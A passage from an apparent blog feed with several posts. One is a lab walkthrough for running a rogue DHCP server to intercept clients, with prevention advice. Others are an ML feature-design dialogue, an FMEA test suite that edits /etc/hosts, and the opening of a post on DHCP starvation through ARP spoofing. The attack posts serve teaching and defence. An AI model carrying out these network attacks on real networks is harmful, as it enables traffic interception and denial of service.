  <li>Before starting up this DHCP server, ensure that this device has at least 2 network interfaces. And, one of the interfaces is configured to fetch IP address via DHCP (from the genuine DHCP server).</li>
  <li>Start the server.</li>
  <li>Observe that the eth1 interface obtained IP address from the genuine DHCP server.</li>
  <li>Follow similar steps as mentioned in the genuine DHCP server for configuration, but with a different subnet, say 192.168.2.1/24 . * Ensure range, routers and domain-name-server fields are aligned to the subnet.</li>
  <li>Assign the primary network interface with a static IP address (within the same subnet as in the DHCP configuration): <code class="language-plaintext highlighter-rouge">ifconfig eth0 192.168.2.1/24</code></li>
  <li>Then start the DHCP server by running: <code class="language-plaintext highlighter-rouge">dhcpd</code></li>
</ul>

<h2 id="run">Run</h2>

<p>Start up multiple clients in the network. Ensure that their network interfaces are configured to fetch IP address via DHCP. Observe the IP address of each client.</p>

<p><img src="/assets/img/mitm-dhcp/run.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">Client-1</code> obtained <code class="language-plaintext highlighter-rouge">192.168.1.154</code> from the genuine DHCP server, while <code class="language-plaintext highlighter-rouge">Client-2</code> obtained <code class="language-plaintext highlighter-rouge">192.168.2.160</code> from the rogue DHCP server. <code class="language-plaintext highlighter-rouge">Client-2</code> has fallen victim!</p>

<p>Observe that in spite of the two clients being in the same collision domain, they will not be able to communicate with each other. The reason is that these two subnets (one maintained by the genuine DHCP server and the other by the rogue DHCP server) form different overlay networks over the same L2 network.</p>

<p>Soon one may realize that this is an opportunistic attack. It is a race between the genuine DHCP server and the rogue DHCP server as to whose DHCP offer the client will accept. The following image shows the filtered network capture of a new client joining the network. Observe the packet number 4 and 5. Both the rogue DHCP server and the genuine DHCP server race to serve the client. In this fortunate and unfortunate case, the client accepted the IP address offer from the genuine DHCP server (evident from packet number 7).</p>

<p><img src="/assets/img/mitm-dhcp/filtered-dhcp.png" alt="" /></p>

<h2 id="inherent-defenses-and-prevention-techniques">Inherent defenses and Prevention techniques</h2>

<p>A malicious user situation himself as a man-in-the-middle lets him overhear all the communication the victim is in with the internet.</p>

<p>However, with today’s secure systems most of the applications communicate over encrypted channels. The key exchange also happens over a secured channel. For example, TLS is used for setting up a HTTPS connection with a server while browsing, and similarly TLS is used for setting up a secure shell with a remote server. Hence, <strong>the risk of this attack is low</strong>.</p>

<p>When building a network, the DHCP server are placed in a predictable and static location. They are connected to a specific port in a switch and the connection rarely changes. Hence, to explicitly prevent such attacks, network switches should be configured to accept DHCP offer and DHCP ACK packets only from a <strong>specified port</strong>. The switch can easily filter off the DHCP offer and ACK packets from other ports, thereby stopping the attack from happening at all.</p>]]></content><author><name></name></author><category term="advanced" /><category term="application" /><category term="cybersecurity" /><category term="networking" /><category term="dhcp" /><category term="featured" /><summary type="html"><![CDATA[Learn how a user can act like a hoax DHCP server and situate himself as a man in the middle, and how one can prevent such attacks]]></summary></entry><entry><title type="html">How I do Machine Learning at work</title><link href="https://www.kmmanoj.me/2021/03/26/how-i-do-machine-learning-at-work.html" rel="alternate" type="text/html" title="How I do Machine Learning at work" /><published>2021-03-26T00:00:00-04:00</published><updated>2021-03-26T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2021/03/26/how-i-do-machine-learning-at-work</id><content type="html" xml:base="https://www.kmmanoj.me/2021/03/26/how-i-do-machine-learning-at-work.html"><![CDATA[<p>I still recall the moment when I was part of the first machine learning project that our team was working on. The requirement was to identify that part of the text that potentially contained date and time information. We were a set of amateur’s in data science aiming to build this date time pattern recognizer. Suddenly from nowhere, I wonder what struck us, we found a fun filled methodology to build and evaluate a model. Technically, we devised a methodology to evaluate if the set of features extracted out of the raw data is sufficient enough for a machine learning algorithm to output satisfactory results. In this blog, I shall explain, with an example, the methodology to evaluate if the feature set is sufficient to build a good machine learning model.</p>

<h2 id="the-example-problem-statement">The Example: Problem statement</h2>

<p>Consider the problem of identifying parts of a text that contains date and time information. The following shows some example texts, with emboldened phrases that resembles what the supervised machine learning model is expected to output.</p>

<ul>
  <li>I won’t be available at <strong>4 pm</strong> on <strong>21st of March</strong>.</li>
  <li>I will be taking off from <strong>20th March</strong> to <strong>25th March 2021</strong>.</li>
  <li>Exactly at <strong>18:30 IST</strong>, the show starts!</li>
</ul>

<blockquote>
  <p>NOTE: You may observe that the example texts do not cover all the cases. The takeaway from this blog is the methodology and not a solution to the date time parsing problem.</p>
</blockquote>

<h2 id="initial-conversation-the-obvious-visible-features">Initial Conversation: The obvious visible features</h2>

<p>The team decides to go word by word and extract features out of each word (token). Each member pitches a lot of features by observing the example texts. Here are some that were concluded to start with:</p>

<ul>
  <li>Number of digits in the token.</li>
  <li>Number of alphabets in the token.</li>
  <li>Length of the token.</li>
  <li>Number of <code class="language-plaintext highlighter-rouge">/</code>(slash) or <code class="language-plaintext highlighter-rouge">-</code>(hyphen) or <code class="language-plaintext highlighter-rouge">:</code>(colon) or <code class="language-plaintext highlighter-rouge">.</code>(dot).</li>
  <li>Is it <em>am</em> or <em>pm</em>?</li>
  <li>Does it end with <em>st</em>, <em>nd</em>, <em>rd</em> or <em>th</em>?</li>
</ul>

<p>Alright! We have enough features to get started.</p>

<h2 id="methodology-refining-the-feature-set">Methodology: Refining the feature set</h2>

<p>For simplicity, let us consider that the team size is 2 and the members are Alice and Bob. The vocal conversation they make are written in standard format, while their thoughts are formatted in italics.</p>

<p>Here is the game!</p>

<ul>
  <li>Alice thinks of a token and evaluates the decided features for the token in her mind.</li>
  <li>Alice then presents the feature values to Bob, without revealing the token.</li>
  <li>Bob speaks his thought process aloud and uses these features to call out either a yes or a no. Yes signifies that the token is part of a potential date and time and a no signifies that the token is not part of a potential date and time.</li>
  <li>Alice then reveals the token and scores Bob if he is right or wrong.</li>
  <li>Finally, the feature set is refined i.e more features are added, one or more features are removed, or one or more existing features are modified, and they reverse their roles and repeat the steps from the beginning.</li>
</ul>

<p>Observe that the intention of this game is to make the opponent find it difficult to make the right classification.</p>

<h2 id="hear-this-conversation-">Hear this conversation …</h2>

<p><strong>Alice</strong>: Let me begin!</p>

<p><strong>Alice</strong>: <em>Given these features, let me think of a month. March! So the features of March are (0, 5, 5, 0, no, no).</em></p>

<p><strong>Alice</strong>: So, the features are (0, 5, 5, 0, no, no). Is this a part of date time or not?</p>

<p><strong>Bob</strong>: There are no digits, so it shouldn’t be value of date or time. A 5-letter word with all of them being alphabets. I can think of many! Words like: value, Alice, games, and months like March, April. I am confused, may be it is NOT a part of date time? Am I right?</p>

<p><strong>Alice</strong>: No! I was thinking of the word “March”. You got it wrong. Let’s refine our feature set. As you were verbalizing your thoughts, I stretched my thoughts a little and came up with this feature. What about a feature that depicts if the token contains the word “Jan”, “Feb”, “Mar”, “Apr” … “Dec” in any case, that is, upper or lower?</p>

<p><strong>Bob</strong>: Yes, that’s great! So feature number 7, Does the token have the word “Jan”, “Feb”, “Mar” … “Dec”.</p>

<p><br /></p>

<p><strong>Bob</strong>: It’s my turn now!</p>

<p><strong>Bob</strong>: <em>Hmm! Where else will I find numbers? Street numbers! Bullseye, I will get “st”, “nd”, “rd” and “th” in it too. Let me think of “3rd” in “3rd block”. The features set for this is (1, 2, 3, 0, no, yes, no).</em></p>

<p><strong>Bob</strong>: Here are the features of the token I thought of, (1, 2, 3, 0, no, yes, no).</p>

<p><strong>Alice</strong>: One digit, two alphabets and it is one of the “st”, “nd”, and “rd”. That’s enough information! I got it! It should be something like “1st”, “2nd”, “4th” etc. So, YES, it IS a part of date and time!</p>

<p><strong>Bob</strong>: Your thought process was right! But, I exploited it 😉! You identified it wrong! I thought of the word “3rd” as in street names. I think we need to look ahead and may be look behind also. Such as a 3-gram? and/or we could use recurrent neural networks.</p>

<p><strong>Alice</strong>: What is a 3-gram? What is recurrent neural networks?</p>

<p><strong>Bob</strong>: <em>… explains what is a 3-gram in the context of Natural Language Processing and Recurrent Neural Networks …</em></p>

<p><br /></p>

<p><strong>Alice</strong>: Amazing! Now, I will ask you, Bob!</p>

<p><strong>Alice</strong>: <em>Hmm! It’s getting difficult for me to think of corner cases now! Let me think of something close! “The 42nd Janitor?” I think he will be able to identify it right. Length of “January” is different from “Janitor”. What about in times. Hmm … “The student scored 99.00 3 times this semester in mathematics.” So, the features for “scored 99.00 3” is ((0, 6, 6, 0, no, no, no), (4, 0, 5, 1, no, no, no), (1, 0, 1, 0, no, no, no)).</em></p>

<p><strong>Alice</strong>: The features for the 3-gram token is ((0, 6, 6, 0, no, no, no), (4, 0, 5, 1, no, no, no), (1, 0, 1, 0, no, no, no)).</p>

<p><strong>Bob</strong>: Interesting! The token contains 4 digits and a dot, or colon, or hyphen, or slash. It must be a half date like 03/21 or time 20:00. It is like a start of a date or time, if at all it is, so I can safely ignore look behind. Looking ahead, I would expect “am” or “pm” in case of a 12 hour clock. But, look ahead seems to be a single number. May be it is something like 16:00 3 March? Is there ways in which it cannot be a date time? Hmm. Percentage? Aha! But, the length of the token should be 6, not 5, if the token contains “%”, as in “11.11%”, or if it is a case of “11.11<space>%" the next token should not be a digit. So, I conclude, it IS part of date and time!</space></p>

<p><strong>Alice</strong>: Incredible thinking! You were close, but still you identified it wrong. I was thinking of the phrase “scored 99.00 3” in the text “He scored 99.00 3 times.” Let’s think of a feature that differentiates these kind of inputs. I believe we also need features to check if the token numbers are in range 0–60, 0–24, and 1–31, to help classify better. But, your thought process made me think that percentage values can also be like time, such as 12.00. Here, is my thought. Let us separate :(colon) count from the other symbols’ counts. The reason being, I observe that dates can have .(dot), /(slash) or -(hyphen) as separators, while time can mostly have :(colon) as separator. We would compromise on outlying times that have symbols other than :(colon) as separator, worse being an input similar to what I thought, “the show is scheduled for 16.00 3 March 2021.” But, this outlier can be ignored for now. It’s not well formed, isn’t it? Probably, as we go along with this conversation we should find ways to tackle these situations too. So to conclude, we modify the feature number 4 to “Number of /(slash) or -(hyphen) or .(dot).” And, we shall add a new feature that depicts “Number of :(colon).” Also, to help classify better, three more features: “Is there a number in token that is in the range 0–60?”, “Is there a number in token that is in the range 0–24?”, “Is there a number in token that is in the range 1–31?”</p>

<p><strong>Alice</strong>: So we are left with these feature, so far -</p>

<ol>
  <li>Number of digits in the token.</li>
  <li>Number of alphabets in the token.</li>
  <li>Length of the token.</li>
  <li>Number of /(slash) or -(hyphen) or .(dot).</li>
  <li>Number of :(colon).</li>
  <li>Is it am or pm?</li>
  <li>Does it end with st, nd, rd or th?</li>
  <li>Does it contain “Jan”, “Feb”, “Mar”, … “Dec”?</li>
  <li>Is there a number in range 0–60?</li>
  <li>Is there a number in range 0–24?</li>
  <li>Is there a number in range 1–31?</li>
</ol>

<p>And, the conversation continues. Alice and Bob are finally happy with the list of features they got. They train a model using the developed features and obtain an amazing model that captures most of the dates and times in text.</p>

<h2 id="conclusion">Conclusion</h2>

<p>This is one of the ways one could build on features for a machine learning problems.</p>

<p>It enables group of people to work together on a single machine learning problem. And, the way the features are extracted have a strong basis on human thought, hence debugging the machine learning model after training it should be easy. On the other hand, as with every other methodology, there are shortcomings in this too. Human brain can consider only a handful of features while working towards evaluating the classification, so it is not very scalable.</p>

<p>Doesn’t this methodology sound familiar? You should have probably realised by now! This is how a Generative Adversarial Network deep learning model is trained! The questioner being the generator and responder being the discriminator. Alice and Bob were proud of themselves. They believe that they would have introduced the world to GAN, if GAN was not already devised.</p>]]></content><author><name></name></author><category term="beginner" /><category term="application" /><category term="AI-ML" /><summary type="html"><![CDATA[A method used among group of data scientists to identify and refine feature set for a machine learning problem]]></summary></entry><entry><title type="html">FMEA of a microservice that uses third-party APIs</title><link href="https://www.kmmanoj.me/2021/01/22/fmea-of-a-microservice-that-uses-third-party-apis.html" rel="alternate" type="text/html" title="FMEA of a microservice that uses third-party APIs" /><published>2021-01-22T23:00:00-05:00</published><updated>2021-01-22T23:00:00-05:00</updated><id>https://www.kmmanoj.me/2021/01/22/fmea-of-a-microservice-that-uses-third-party-apis</id><content type="html" xml:base="https://www.kmmanoj.me/2021/01/22/fmea-of-a-microservice-that-uses-third-party-apis.html"><![CDATA[<p>Microservice architecture is an architectural style wherein an application is broken down into independent components that are capable of providing a specific service. When a chain of these components is invoked, a business logic of the application is serviced.</p>

<p>Be it any architecture style, the quality of the software is crucial in providing flawless and trust-worthy service. Intensive testing is key to releasing a quality software. Software engineers perform multiple levels of testing to ensure that the microservice, business logic and eventually the whole application does not misbehave in any case. One such testing process is called the <a href="https://en.wikipedia.org/wiki/Failure_mode_and_effects_analysis">FMEA</a>.</p>

<p><strong>FMEA</strong> stands for Failure Mode and Effect Analysis. It is a process involved in quality testing where one or more components of an application is intentionally brought down (or) the connection failure is simulated to study the behavior of the microservice that depends on the called microservice that failed. This process is critical in ensuring that there is no cascading of failures among the microservices involved in a business logic. Failing to perform FMEA could drift an application to an unstable state or worse display server error containing potentially sensitive information to the end user.</p>

<p>Well, it is relatively easy to bring down a self-owned microservice in the test stage to study the behavior of the dependent microservice in the test stage. What about FMEA of a microservice that depends on a third-party API? One does not have control over the operational status of the third-party API. So, that scopes down to simulating failure of third-party APIs.</p>

<p><strong>Following up, how do I simulate failure of an API endpoint that I don’t have control over?</strong></p>

<h2 id="methodology">Methodology</h2>

<p>Recall or observe a typical implementation of a microservice. There are parts of the code that performs a HTTP(S) request (or could be any other protocol) to an API endpoint. The API endpoint is represented as a constant in the form of a domain name in the implementation. Do you find something interesting in the previous statement?</p>

<p><em>The API endpoint is represented in the form of a <strong>domain name</strong> and <strong>not</strong> in the form of an <strong>IP address</strong>.</em></p>

<p>Leveraging this pattern seen among the implementations, what if one could point the API endpoint domain name to an IP address that is not running the service? Doesn’t it simulate a API call failure?</p>

<p>For example, consider a third-party API endpoint <code class="language-plaintext highlighter-rouge">api.example.com</code> that resolves to <code class="language-plaintext highlighter-rouge">1.2.3.4</code> and provides weather information of a queried location on port 443. A microservice being analysed should be made to believe that <code class="language-plaintext highlighter-rouge">api.example.com</code> resolves to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> , where no service is running at port 443. Consequently, when the microservice is run, it attempts to make an API call to <code class="language-plaintext highlighter-rouge">api.example.com</code> and eventually fails since <code class="language-plaintext highlighter-rouge">127.0.0.1</code> is not running the weather information service at port 443.</p>

<h2 id="how-do-we-do-that">How do we do that?</h2>

<p>DNS cache poisoning!</p>

<p>Let’s analyse how a DNS resolution of a domain name happens in a host. A host crafts a DNS request for the domain name and passes it to the network driver. At this point, the host tries to resolve the query by finding the domain name in its local DNS cache. If not found, then it recursively queries the gateway which checks its local DNS cache (capable of resolving DNS), then to ISP gateway and so on to the actual DNS servers. Observe, we do have control over the host, so let’s attempt to tamper the DNS cache of the host to point the third-party API domain name to an IP address that does not run the specified service, for example, <code class="language-plaintext highlighter-rouge">api.example.com</code> to <code class="language-plaintext highlighter-rouge">127.0.0.1</code></p>

<p>There is a special text file <code class="language-plaintext highlighter-rouge">/etc/hosts</code> in *nix based systems and <code class="language-plaintext highlighter-rouge">C:\Windows\System32\Drivers\etc\hosts</code> in windows systems, which is an extension of the local DNS cache. This is the first place that a host looks up to resolve a DNS query. Bullseye!</p>

<p><strong>Thus, by adding a new row in the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with the third-party API endpoint pointing to an IP address that is not running the specified service, one could simulate third-party API failure.</strong></p>

<h2 id="dont-talk-show-me-the-code">Don’t talk, show me the code</h2>

<p>Consider a microservice that checks if an input string is a pokemon and/or a python module. For example,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Request:
GET /tensorflow

Response:
{    
    "is_python_module": true,
    "is_pokemon": false
}
</code></pre></div></div>

<h2 id="development">Development</h2>

<p>The following code shows the implementation of the microservice. Observe the two third-party APIs being used, namely:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pypi.org</code>: To identify if the input string is a python module</li>
  <li><code class="language-plaintext highlighter-rouge">pokeapi.co</code>: To identify if the input string is a pokemon</li>
</ul>

<p>It queries the two API endpoint for details pertaining to the input string. Using the obtained information, the microservice updates the response accordingly and returns the result.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/&lt;input_string&gt;"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">microservice</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
    <span class="n">pypi_endpoint</span> <span class="o">=</span> <span class="s">"https://pypi.org/simple/{module_name}"</span>
    <span class="n">poke_api_endpoint</span> <span class="o">=</span> <span class="s">"https://pokeapi.co/api/v2/pokemon/{pokemon}"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span>
        <span class="n">is_python_module</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
        <span class="n">is_pokemon</span><span class="o">=</span><span class="bp">None</span>
    <span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">pypi_response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
            <span class="n">pypi_endpoint</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span>
                <span class="n">module_name</span><span class="o">=</span><span class="n">input_string</span>
            <span class="p">),</span> 
            <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span>
        <span class="p">)</span>
        <span class="n">py_module_status_code</span> <span class="o">=</span> <span class="n">pypi_response</span><span class="p">.</span><span class="n">status_code</span>
        <span class="n">response</span><span class="p">[</span><span class="s">'is_python_module'</span><span class="p">]</span> <span class="o">=</span> <span class="n">py_module_status_code</span><span class="o">//</span><span class="mi">100</span> <span class="o">==</span> <span class="mi">2</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">pass</span>
    
    <span class="k">try</span><span class="p">:</span>
        <span class="n">poke_response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
            <span class="n">poke_api_endpoint</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span>
                <span class="n">pokemon</span><span class="o">=</span><span class="n">input_string</span>
            <span class="p">),</span> 
            <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span>
        <span class="p">)</span>
        <span class="k">if</span> <span class="n">poke_response</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span> <span class="o">==</span> <span class="s">'Not Found'</span><span class="p">:</span>
            <span class="n">response</span><span class="p">[</span><span class="s">'is_pokemon'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">elif</span> <span class="s">'id'</span> <span class="ow">in</span> <span class="n">poke_response</span><span class="p">.</span><span class="nf">json</span><span class="p">():</span>
            <span class="n">response</span><span class="p">[</span><span class="s">'is_pokemon'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">pass</span>

    <span class="k">return</span> <span class="n">response</span> 

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="testing">Testing</h2>

<p>The following code shows the FMEA test automation for three scenarios (for *nix based systems):</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pokeapi.co</code> is down, while <code class="language-plaintext highlighter-rouge">pypi.org</code> is healthy</li>
  <li><code class="language-plaintext highlighter-rouge">pokeapi.co</code> is healthy, while <code class="language-plaintext highlighter-rouge">pypi.org</code> is down</li>
  <li><code class="language-plaintext highlighter-rouge">pokeapi.co</code> is down, and <code class="language-plaintext highlighter-rouge">pypi.org</code> is down</li>
</ul>

<blockquote>
  <p>NOTE: the test case when both APIs are healthy is skipped intentionally.</p>
</blockquote>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">unittest</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="kn">from</span> <span class="n">check_pk_and_py</span> <span class="kn">import</span> <span class="n">microservice</span>

<span class="k">class</span> <span class="nc">TestPokeOnlyDown</span><span class="p">(</span><span class="n">unittest</span><span class="p">.</span><span class="n">TestCase</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">setUp</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'cp /etc/hosts /etc/hosts.orig'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'echo "127.0.0.1</span><span class="se">\t</span><span class="s">pokeapi.co" &gt;&gt; /etc/hosts'</span><span class="p">)</span>
    
    <span class="k">def</span> <span class="nf">test_poke_down</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">output</span> <span class="o">=</span> <span class="nf">microservice</span><span class="p">(</span><span class="s">'pikachu'</span><span class="p">)</span>
        <span class="k">with</span> <span class="n">self</span><span class="p">.</span><span class="nf">subTest</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">assertIsNotNone</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="s">'is_python_module'</span><span class="p">])</span>
        <span class="k">with</span> <span class="n">self</span><span class="p">.</span><span class="nf">subTest</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">assertIsNone</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="s">'is_pokemon'</span><span class="p">])</span>

    <span class="k">def</span> <span class="nf">tearDown</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'cp /etc/hosts.orig /etc/hosts'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'rm /etc/hosts.orig'</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">TestPypiOnlyDown</span><span class="p">(</span><span class="n">unittest</span><span class="p">.</span><span class="n">TestCase</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">setUp</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'cp /etc/hosts /etc/hosts.orig'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'echo "127.0.0.1</span><span class="se">\t</span><span class="s">pypi.org" &gt;&gt; /etc/hosts'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">test_pypi_down</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">output</span> <span class="o">=</span> <span class="nf">microservice</span><span class="p">(</span><span class="s">'tensorflow'</span><span class="p">)</span>
        <span class="k">with</span> <span class="n">self</span><span class="p">.</span><span class="nf">subTest</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">assertIsNone</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="s">'is_python_module'</span><span class="p">])</span>
        <span class="k">with</span> <span class="n">self</span><span class="p">.</span><span class="nf">subTest</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">assertIsNotNone</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="s">'is_pokemon'</span><span class="p">])</span>

    <span class="k">def</span> <span class="nf">tearDown</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'cp /etc/hosts.orig /etc/hosts'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'rm /etc/hosts.orig'</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">TestPypiPokeDown</span><span class="p">(</span><span class="n">unittest</span><span class="p">.</span><span class="n">TestCase</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">setUp</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'cp /etc/hosts /etc/hosts.orig'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'echo "127.0.0.1</span><span class="se">\t</span><span class="s">pypi.org" &gt;&gt; /etc/hosts'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'echo "127.0.0.1</span><span class="se">\t</span><span class="s">pokeapi.co" &gt;&gt; /etc/hosts'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">test_pypi_poke_down</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">output</span> <span class="o">=</span> <span class="nf">microservice</span><span class="p">(</span><span class="s">'ditto'</span><span class="p">)</span>
        <span class="k">with</span> <span class="n">self</span><span class="p">.</span><span class="nf">subTest</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">assertIsNone</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="s">'is_python_module'</span><span class="p">])</span>
        <span class="k">with</span> <span class="n">self</span><span class="p">.</span><span class="nf">subTest</span><span class="p">():</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">assertIsNone</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="s">'is_pokemon'</span><span class="p">])</span>

    <span class="k">def</span> <span class="nf">tearDown</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'cp /etc/hosts.orig /etc/hosts'</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="s">'rm /etc/hosts.orig'</span><span class="p">)</span>
</code></pre></div></div>

<p>Run the tests as a user (such as root) who is allowed to edit <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. All the three test cases should pass now. The quality of the software is maintained!</p>]]></content><author><name></name></author><category term="intermediate" /><category term="application" /><category term="software-engineering" /><summary type="html"><![CDATA[How do I simulate failure of an API endpoint that I don't have control over while performing Failure Mode and Effect Analysis?]]></summary></entry><entry><title type="html">DHCP starvation attack without making any DHCP requests</title><link href="https://www.kmmanoj.me/2020/08/20/dhcp-starvation-attack-without-making-any-dhcp-requests.html" rel="alternate" type="text/html" title="DHCP starvation attack without making any DHCP requests" /><published>2020-08-20T00:00:00-04:00</published><updated>2020-08-20T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2020/08/20/dhcp-starvation-attack-without-making-any-dhcp-requests</id><content type="html" xml:base="https://www.kmmanoj.me/2020/08/20/dhcp-starvation-attack-without-making-any-dhcp-requests.html"><![CDATA[<p>DHCP, Dynamic host configuration protocol, is a network protocol that offers an IP address and other required details that include gateway IP, DNS IP to a host that enters a network. The DHCP protocol as defined in <a href="https://tools.ietf.org/html/rfc2131">RFC2131</a> involves 4 transactions back and forth between the client and server, namely:</p>

<ul>
  <li>DHCP Discover - broadcast from the client</li>
  <li>DHCP Offer - broadcast from the server</li>
  <li>DHCP Request - unicast from client</li>
  <li>DHCP ACK - unicast from server</li>
</ul>

<p><a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">Wikipedia explains the DHCP protocol amazingly!</a></p>

<h2 id="dhcp-attacks">DHCP Attacks</h2>

<p>Similar to the ARP protocol, due to its inability to authenticate users who enter the network, there have been multiple types of attacks on the protocol. Here are some of the well-known DHCP attacks:</p>

<ul>
  <li><strong>DHCP Snooping</strong>: In this attack, a malicious client acts as a DHCP server and services clients as they enter the network. The malicious client could send custom gateway and DNS server IPs to establish itself as a man-in-the-middle and perform DNS poisoning.</li>
  <li><strong>DHCP Starvation</strong>: In this attack, a malicious client sends multiple DHCP requests and holds all the IP address present in the DHCP pool, thereby not allowing any new host to join the network. Denial of Service.</li>
</ul>

<h2 id="dhcp-starvation---protocol-dissection">DHCP starvation - Protocol dissection</h2>

<p>The following image shows a screenshot of the packet capture during a DHCP transaction.</p>

<p><img src="/assets/img/dhcp-starvation/dhcp.png" alt="Packet capture of DHCP transactions" />
<br /><small style="color: gray">Packet capture of DHCP transactions</small><br /></p>

<h3 id="what-is-arp-doing-here">What is ARP doing here?</h3>

<p>The DHCP server broadcasts an ARP request followed by an ICMP request to ensure that the IP address that it is going to DHCP Offer is indeed available. Eureka?</p>

<p>Why does one need to make a DHCP request to starve the DHCP pool? Most of the defensive systems look for repeated DHCP requests from the same MAC address. What if I replied to DHCP’s ARP request and made DHCP believe that the IP address is already in use?</p>

<p>Thus, in this article let’s see how one can carry out ARP spoofing to impersonate a client that does not exist to make the DHCP server believe that the IP address that is picked from the pool to make DHCP Offer is already held by another client.</p>

<h2 id="the-experiment">The Experiment</h2>

<p>In this experiment, let us use <a href="https://www.gns3.com/">GNS3</a>, a network simulation tool, and <a href="https://www.docker.com/">Docker</a> containers as a DHCP server, a malicious client, and a benign client.</p>

<h3 id="dhcp-server">DHCP Server</h3>

<p>Let us create a DHCP server from scratch. Login to the GNS3 VM (this is where containers spin up). ISC DHCP server software is used to configure and run a DHCP server in ubuntu container [<a href="https://www.tecmint.com/install-dhcp-server-in-ubuntu-debian/">Reference</a>].</p>

<ul>
  <li>Create a Dockerfile with the following contents:</li>
</ul>

<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> ubuntu</span>
<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> vim net-tools isc-dhcp-server
</code></pre></div></div>

<ul>
